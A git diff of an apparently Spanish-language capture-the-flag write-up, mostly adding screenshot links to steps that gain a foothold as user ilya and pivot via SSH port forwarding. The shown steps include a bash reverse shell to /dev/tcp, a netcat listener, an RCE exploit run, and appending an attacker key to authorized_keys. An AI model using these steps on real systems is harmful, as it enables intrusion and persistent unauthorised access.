@@ -427,6 +427,7 @@ response = read_socket(socket_id)
 
 </code></pre>
 
+
 <h1>User</h1>
 <p>Siga el mismo procedimiento a continuación..</p>  
 <p>Prepare el shell inverso -> bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1. Guárdelo como payload.py.</p>  
@@ -434,7 +435,7 @@ response = read_socket(socket_id)
 <p>Ejecute el oyente -> nc -nlvp 4444..</p> 
 <p>Ejecute el archivo de explotación desde el repositorio -> python3 RCE.py — destino https://10.10.x.x -i 127.0.0.1 -p 40056.</p> 
 <p>Cuando la sesión queda atrapada en el lado del oyente, podemos ver que hemos ingresado exitosamente al puerto ssh del usuario ilya. .</p> 
-
+<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-24%20212106.png?raw=true" alt="Captura de pantalla">
 
 <h1>Bandera ROOT</h1>
 <p>El shell SSH de ilya actual se cerrará repetidamente después de unos minutos..</p> 
@@ -446,24 +447,26 @@ ssh-keygen
 
 <p>Complete los datos necesarios y se le proporcionará la clave pública ssh con extensión .pub. Copie la clave pública completa..</p> 
 <p>Utilice el siguiente comando para configurarlo como clave autorizada. Ejecute el siguiente comando en el shell de escucha existente para encontrar la bandera del usuario.</p> 
+<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-24%20224103.png?raw=true" alt="Captura de pantalla">
 
 <pre><code>
   echo "TU PUB KEY" | tee -a ~/.ssh/authorized_keys
 </code></pre>
 
 <p>Después de la ejecución exitosa, abra una nueva terminal para abrir el puerto SSH del usuario ilya. El uso será en el puerto SSH de ilya..</p> 
+
 <p>Puedes encontrar un archivo txt que contiene información sobre el otro usuario “Sergej”..</p> 
 -----------
 <p>Podemos usar netstat para encontrar los puertos de escucha y de actividad en la máquina. Podemos encontrar los puertos 5000 y 7096 que son interesantes..</p> 
-
+https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-24%20224222.png?raw=true
 ---------------------------------------------------
 <p>Salga de la terminal actual. En el siguiente paso, utilizaremos el método Port Forwarding. Ejecute el siguiente comando en una nueva terminal..</p>
 <pre><code>
 ssh -i id_rsa ilya@10.10.x.x -L 7096:127.0.0.1:7096 -L 5000:127.0.0.1:5000
 </code></pre>
-
+<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-24%20224905.png?raw=true" alt="Captura de pantalla">
 <h1>Abra el navegador y navegue hasta https://127.0.0.1:7096</h1>
----------------------------------------------------------------------
+<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-24%20224918.png?raw=true" alt="Captura de pantalla">
 <p>Con la ayuda de chat gpt se ha realizado un scripts que nos ayudara a explotar esta pagina.</p>
 <pre><code>
 script.py
